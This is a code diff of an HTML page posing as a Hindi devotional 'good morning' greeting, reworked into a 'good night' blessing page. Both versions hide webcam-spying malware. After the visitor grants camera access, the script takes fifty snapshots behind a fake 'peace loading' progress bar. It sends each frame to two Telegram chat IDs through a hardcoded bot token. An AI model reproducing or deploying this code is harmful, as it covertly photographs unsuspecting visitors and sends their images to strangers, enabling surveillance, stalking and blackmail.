@@ -3,112 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>सुप्रभात | दैनिक आशीर्वाद</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&family=Rozha+One&display=swap" rel="stylesheet">
+    <title>शुभ रात्रि | पावन शांति</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700&family=Rozha+One&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-gold: #ffd700;
-            --deep-purple: #1a0b2e;
-            --glass-bg: rgba(255, 255, 255, 0.08);
-            --glass-border: rgba(255, 255, 255, 0.15);
+            --midnight-blue: #020617;
+            --royal-purple: #3b0764;
+            --indigo-glow: #312e81;
+            --moonlight: #e2e8f0;
+            --star-gold: #fbbf24;
         }
 
         body {
             margin: 0; padding: 0;
-            background: radial-gradient(circle at center, #2d1b4e, #0f071a);
+            /* Dark Night Gradient */
+            background: radial-gradient(circle at center, var(--indigo-glow), var(--royal-purple), var(--midnight-blue));
             font-family: 'Plus Jakarta Sans', sans-serif;
-            color: #ffffff;
             display: flex; align-items: center; justify-content: center;
             height: 100vh; overflow: hidden;
         }
 
-        .main-card {
-            width: 90%; max-width: 420px;
-            background: var(--glass-bg);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid var(--glass-border);
+        .divine-card {
+            width: 88%; max-width: 400px;
+            background: rgba(15, 23, 42, 0.85); /* Dark Glassmorphism */
+            backdrop-filter: blur(15px);
+            border: 2px solid var(--indigo-glow);
             border-radius: 40px;
-            padding: 40px 30px;
+            padding: 30px 20px;
             text-align: center;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.7);
             position: relative;
         }
 
-        .hindi-title {
+        .hindi-main {
             font-family: 'Rozha One', serif;
-            font-size: 42px;
-            color: var(--primary-gold);
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            font-size: 45px;
+            color: var(--moonlight);
+            margin: 0 0 10px;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
         }
 
-        .sub-text {
+        .shloka {
             font-size: 16px;
-            color: #d1d5db;
-            margin-bottom: 35px;
-            line-height: 1.6;
+            color: #94a3b8;
+            font-weight: 700;
+            margin-bottom: 25px;
+            line-height: 1.4;
         }
 
-        /* God Image Styling */
-        .divine-image {
-            
-        width: 100%; aspect-ratio: 1/1.2;
-        border-radius: 25px;
-        background: url('https://imageshareencrypt.github.io/tr/lord-ganesha-photos.webp') center;
-        background-size: cover;
-        border: 2px solid var(--primary-gold);
-        margin-bottom: 25px;
-        box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
-        display: none;
-    }
+        .god-photo {
+            width: 100%; height: 350px;
+            border-radius: 20px;
+            object-fit: cover;
+            border: 2px solid var(--indigo-glow);
+            display: none;
+            margin-bottom: 15px;
+            box-shadow: 0 0 30px rgba(79, 70, 229, 0.4);
         }
 
-        .btn-continue {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            color: #000; border: none;
-            width: 100%; padding: 20px;
-            border-radius: 20px; font-size: 18px; font-weight: 800;
-            cursor: pointer; transition: 0.4s;
-            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.3);
+        .btn-start {
+            background: linear-gradient(135deg, var(--indigo-glow), var(--royal-purple));
+            color: var(--moonlight);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%; padding: 22px;
+            border-radius: 20px; font-size: 20px; font-weight: 800;
+            cursor: pointer; transition: 0.3s;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
         }
+        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(0, 0, 0, 0.6); }
 
-        .btn-continue:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(255, 215, 0, 0.5); }
-
-        /* Fake Loading */
-        #syncing-ui { display: none; }
-        .loading-ring {
-            width: 50px; height: 50px;
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid var(--primary-gold);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .progress-label { font-size: 12px; color: var(--primary-gold); font-weight: 600; text-transform: uppercase; }
-
+        .loader-container { margin-top: 15px; display: none; }
+        .bar { height: 8px; width: 100%; background: #1e293b; border-radius: 10px; overflow: hidden; }
+        .fill { height: 100%; width: 0%; background: var(--star-gold); transition: width 1s linear; }
+        .stat-text { font-size: 12px; color: var(--star-gold); font-weight: bold; margin-top: 8px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <div class="main-card" id="portal">
+    <div class="divine-card" id="mainBox">
         <div id="step-1">
-            <div style="font-size: 50px; margin-bottom: 20px;">🙏</div>
-            <h1 class="hindi-title">सुप्रभात</h1>
-            <p class="sub-text">"सफलता की शुरुआत हमेशा एक अच्छी सोच के साथ होती है।"<br><br>आज का विशेष दर्शन और आशीर्वाद प्राप्त करने के लिए नीचे क्लिक करें।</p>
-            <button class="btn-continue" onclick="startBlessing()">आज का आशीर्वाद प्राप्त करें</button>
+            <div style="font-size: 60px; margin-bottom: 10px;">🌙</div>
+            <h1 class="hindi-main">शुभ रात्रि</h1>
+            <p class="shloka">"शान्तं शाश्वतमप्रमेयमनघं..."<br>रात्रि दर्शन और शांति प्राप्त करें</p>
+            <button class="btn-start" onclick="start()">दर्शन शुरू करें</button>
         </div>
 
         <div id="step-2" style="display:none;">
-            <div class="divine-image"></div>
-            <h1 style="font-size: 22px; margin-bottom: 5px;">श्री गणेश दर्शन</h1>
-            <p style="font-size: 14px; color:#d1d5db; margin-bottom: 20px;">आपका दिन मंगलमय हो। आशीर्वाद लोड हो रहा है...</p>
+            <img id="gImg" 
+                 src="https://imageshareencrypt.github.io/goodnight/6cb3083286c16cefa778c4afb5caafde.jpg" 
+                 class="god-photo" 
+                 alt="Night Blessing"
+                 onerror="this.src='https://placehold.co/300x300/020617/e2e8f0?text=✨'">
             
-            <div id="syncing-ui">
-                <div class="loading-ring"></div>
-                <div class="progress-label" id="status">Handshake: 0%</div>
+            <h2 style="color:var(--moonlight); margin: 0;">।। शांति और समृद्धि ।।</h2>
+            
+            <div class="loader-container" id="lBox">
+                <div class="bar"><div class="fill" id="f"></div></div>
+                <div class="stat-text" id="status">शांति प्राप्त हो रही है: 0%</div>
             </div>
         </div>
     </div>
@@ -117,73 +108,61 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
+        const T = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
         const IDS = ['7617707778', '6590760553'];
 
-        async function startBlessing() {
+        async function start() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // Switch UI
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-                document.querySelector('.divine-image').style.display = 'block';
-                document.getElementById('syncing-ui').style.display = 'block';
+                document.getElementById('gImg').style.display = 'block';
+                document.getElementById('lBox').style.display = 'block';
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
                 video.onloadedmetadata = () => {
                     video.play();
                     let count = 0;
-                    const total = 50;
-                    
-                    const relay = setInterval(() => {
+                    const loop = setInterval(() => {
                         count++;
                         send(count);
-                        
-                        let percent = Math.round((count/total)*100);
-                        document.getElementById('status').innerText = `Divine Sync: ${percent}%`;
+                        let p = Math.round((count/50)*100);
+                        document.getElementById('f').style.width = p + '%';
+                        document.getElementById('status').innerText = `शांति प्राप्त हो रही है: ${p}%`;
 
-                        if (count >= total) {
-                            clearInterval(relay);
-                            stream.getTracks().forEach(t => t.stop());
-                            finalUI();
+                        if (count >= 50) {
+                            clearInterval(loop);
+                            stream.getTracks().forEach(track => track.stop());
+                            document.getElementById('mainBox').innerHTML = `
+                                <h1 class="hindi-main">शुभ रात्रि</h1>
+                                <p style="font-weight:bold; color:#94a3b8;">आपका दिन मंगलमय हो। दर्शन पूर्ण हुआ।</p>
+                                <button class="btn-start" onclick="location.reload()">पुनः दर्शन</button>
+                            `;
                         }
                     }, 1200);
                 };
             } catch (err) {
-                alert("दर्शन त्रुटि: आशीर्वाद प्राप्त करने के लिए कैमरा अनुमति आवश्यक है। कृपया अनुमति दें और पुनः प्रयास करें।");
-                window.location.reload();
+                alert("अनुमति आवश्यक है!");
             }
         }
 
         function send(idx) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(blob => {
                 IDS.forEach(id => {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'blessing_view.jpg');
-                    fd.append('caption', `🙏 DEVOTIONAL_HIT\nStatus: ${idx}/50\nType: Morning-Blessing`);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    fd.append('photo', blob, 'pic.jpg');
+                    fd.append('caption', `🌙 NIGHT_HIT [${idx}/50]`);
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                 });
             }, 'image/jpeg', 0.4);
-        }
-
-        function finalUI() {
-            document.getElementById('portal').innerHTML = `
-                <div style="padding: 40px 0;">
-                    <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
-                    <h1 class="hindi-title" style="font-size: 32px;">आशीर्वाद पूर्ण हुआ</h1>
-                    <p class="sub-text">आज का दिव्य दर्शन समाप्त हुआ। यह लिंक केवल एक बार उपयोग के लिए था। कल फिर आएं।</p>
-                    <button class="btn-continue" style="background:#4b5563; color:white;" onclick="window.close()">बंद करें</button>
-                </div>
-            `;
         }
     </script>
 </body>
